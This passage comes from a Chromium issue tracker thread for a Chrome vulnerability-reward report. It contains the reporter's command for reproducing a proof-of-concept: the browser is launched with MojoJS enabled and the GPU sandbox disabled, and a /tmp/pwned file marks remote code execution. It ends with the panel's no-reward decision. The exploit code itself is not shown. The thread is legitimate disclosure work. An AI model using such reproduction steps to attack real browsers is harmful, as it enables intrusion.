I was trying to validate if the provided exploit achieved RCE against the unfixed version.

### qq...@calif.io (2026-05-19)

#27

Could I have your kernel version + libc + GPU (e.g. chrome://gpu) / reproduce env information you are testing so I can adapt it better for you?

I believe I know why you cannot reproduce this: GLIfaceOff is a deterministic PA-pool-relative offset. Different distros / kernel / drivers may result in different values here. Meanwhile, let me find a better way to demo this, potentially making things more portable.

### qq...@calif.io (2026-05-22)

@aj...@google.com:

Could you try the new PoC here? My last PoC is env sensitive (e.g. different distro/drivers may not repro). This one fixed it.

```
./google-chrome-stable-146.0.7680.164/opt/google/chrome/chrome \
      --enable-blink-features=MojoJS \
      --enable-features=RemoveGPULegacyIPC \
      --enable-logging=stderr \
      --disable-popup-blocking \
      --disable-component-update \
      --no-gpu-sandbox \
      --no-first-run \
      --no-default-browser-check \
      --user-data-dir=$(mktemp -d /tmp/mojojs.XXXXXX) \
      "file:///$PWD/poc_vrp.html"

# Wait for around 100 seconds
ls -lah /tmp/pwned

```

We tested this on:

- Ubuntu 24.04 x64 with AMD iGPU
- CachyOS x64 (latest) with AMD GPU (radv)

Both work.

### sp...@google.com (2026-05-26)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

The panel reassessed the report and have decided that no additional reward is possible.

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

### ch...@google.com (2026-07-01)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/491191118)*
